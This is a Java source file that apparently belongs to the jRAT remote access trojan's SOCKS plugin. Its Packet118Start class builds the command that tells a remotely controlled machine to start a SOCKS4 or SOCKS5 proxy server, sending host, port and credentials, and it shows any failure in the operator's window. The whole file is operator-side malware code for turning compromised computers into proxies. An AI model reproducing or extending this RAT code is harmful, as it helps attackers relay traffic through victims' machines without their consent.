package se.jrat.plugin.socks.client;

import java.awt.Color;
import java.io.DataInputStream;
import java.io.DataOutputStream;

import jrat.api.PacketBuilder;
import jrat.api.RATObject;
import se.jrat.plugins.socks.Global;

public class Packet118Start extends PacketBuilder {
	
	private boolean socks5;
	private boolean auth;
	private String user;
	private String pass;
	private String host;
	private int port;
	
	private FrameSocks frame;

	public Packet118Start(RATObject rat, boolean socks5, boolean auth, String user, String pass, String host, int port) {
		super(Global.HEADER_START, rat);
		this.socks5 = socks5;
		this.auth = auth;
		this.user = user;
		this.pass = pass;
		this.host = host;
		this.port = port;
	}

	@Override
	public void write(RATObject rat, DataOutputStream dos, DataInputStream dis) throws Exception {
		dos.writeBoolean(socks5);
		dos.writeUTF(host);
		dos.writeInt(port);
		dos.writeBoolean(auth);
		dos.writeUTF(user);
		dos.writeUTF(pass);
		
		if (!dis.readBoolean()) {
			String error = dis.readUTF();
			if (frame != null) {
				frame.setLabelColor(Color.red);
				frame.setLabelText("Failed to start server: " + error);
			}
		}
	}
	
	public void setFrame(FrameSocks frame) {
		this.frame = frame;
	}

}
